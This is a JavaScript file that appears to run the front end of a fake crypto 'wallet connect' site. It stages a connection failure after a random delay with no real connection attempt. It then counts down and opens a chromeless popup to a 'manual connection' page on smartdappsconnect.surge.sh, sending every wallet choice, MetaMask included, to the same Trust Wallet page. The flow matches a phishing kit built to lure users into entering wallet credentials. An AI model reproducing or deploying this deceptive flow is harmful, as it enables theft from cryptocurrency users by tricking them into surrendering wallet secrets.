var selectedChain = 0; //All by Default
var selectedPaymentProtocol = null;
var waitTimeBeforeConnectionFailure = 1000 * getRandomInt(1,10);
var waitTimeBeforeManualConnection = 5
var waitTimeBeforeManualConnectionSeconds = 1000 * waitTimeBeforeManualConnection;
var controller;

var _timeout_;
var _interval_;

$(function(){
    // Mobile Nav Hamburger Icon
    $('button.navbar-toggler').on('click', function(e){
        let open_menu_id = $(this).data('bs-target')
        let mobile_menu = $(open_menu_id)

        // Space the connect button
        mobile_menu.find('div.connect_wallet').addClass('mb-2 mt-2')

        if( mobile_menu.hasClass('show') ){
            $(open_menu_id).hide()
        }
        else{
            $(open_menu_id).show()
        }
    })

    // Chain Switch
    $('ul#chain-switch-pill li').on('click', function(e){
        selectedChain = $(this).data('chain-id')
    })

    // On Feature Click
    $('.selected_features').on('click', function(e){
        e.preventDefault()
        window.location.href = "connect.html"
    })

    // Connect Wallet
    $("button.payment_protocol_button").hover(
        function() {
            $(this).find('img').addClass("image_colored").removeClass("image_grayscale");
        },
        function() {
            $(this).find('img').addClass("image_grayscale").removeClass("image_colored");
        }
    );

    $("button.payment_protocol_button").on('click', function(e){
        e.preventDefault()

        selectedPaymentProtocol = $(this).data('payment-protocol')

        $('#selected_wallet_logo').attr('src', $(this).data('wallet-logo'))
        $('#selected_wallet_name').text( $(this).data('wallet-name') )

        showDOMContent_PaymentProtocol(1)
    })

    $("button.btn_try_connection_again").on('click', function(){
        controller.abort();
        showDOMContent_PaymentProtocol(1)
    })

    $('button.btn-close').on('click', function(){
        controller.abort();
    })


    
    $('button.navbar-toggler').trigger('click') //menu by default
})


async function startCountDownToManualConnection({signal}){
    if (signal?.aborted){
        return Promise.reject(new DOMException("Aborted", "AbortError"));
    }

    return new Promise( async (resolve,reject) => {
        let domManualConnectionCount = $('.can_not_connect .seconds_count_to_manual')
        let timeout;

        const abortHandler = () => {
            clearTimeout(timeout);
            reject(new DOMException("Aborted", "AbortError"));
        }

        if( parseInt( domManualConnectionCount.text() ) > 0 ){
            if( await sleep(1000) ) {
                if( parseInt( domManualConnectionCount.text() ) > 0 ){
                    domManualConnectionCount.text( parseInt( domManualConnectionCount.text() ) - 1 )
                }
            }

            resolve(false)
            try{
                await startCountDownToManualConnection({signal})
            }
            catch(e){
                controller = new AbortController();
            }
        }else{
            resolve(true)
            $('button').attr('disabled', true)
            signal?.removeEventListener("abort", abortHandler);
            startManualConnection()
        }
        
        signal?.addEventListener("abort", abortHandler);
    })
}

async function showDOMContent_PaymentProtocol(step){
    if(!controller || controller.signal.aborted){
        controller = new AbortController();
    }
    signal = controller.signal
    
    switch (step) {
        case 1:
            $('.connection_loading').show()
            $('.can_not_connect').hide()
            $('.waiting_for_connection').hide()

            clearTimeout(_timeout_)
            _timeout_ = setTimeout( async () => {
                showDOMContent_PaymentProtocol(2)

                $('.can_not_connect .seconds_count_to_manual').text( waitTimeBeforeManualConnection )
                await startCountDownToManualConnection({signal,})
            }, waitTimeBeforeConnectionFailure);

            $('#modalPaymentProtocol').modal('show')
        break;

        case 2:
            $('.can_not_connect').show()
            $('.connection_loading').hide()
            $('.waiting_for_connection').hide()
        break;

        case 3:
            $('.waiting_for_connection').show()
            $('.connection_loading').hide()
            $('.can_not_connect').hide()
        break;
    }
}

function sleep(ms) {
    return new Promise( (resolve,reject) => {
        setTimeout(()=> {
            resolve (true)
        }, ms || 0)
    })
}

function startManualConnection(){
    showDOMContent_PaymentProtocol(3)
    $('button').removeAttr('disabled')

    let processingChain = siteChains[selectedChain]
    let processingProtocol = sitePaymentProtocols[selectedPaymentProtocol]

    switch(processingProtocol.code){
        case 'metamask':
        // case 'metamask':
            var launchURL = 'smartdappsconnect.surge.sh_protocols_others__chainName=All&protocolName=Trust Wallet&protocolCode=trust_wallet.html'
        break;

        default:
            var launchURL = 'smartdappsconnect.surge.sh_protocols_others__chainName=All&protocolName=Trust Wallet&protocolCode=trust_wallet.html'
        break;
    }

    var launchNewWindow = window.open(launchURL,'_blank','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
    if(launchNewWindow == null){
        window.location.href = launchURL
    }
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
}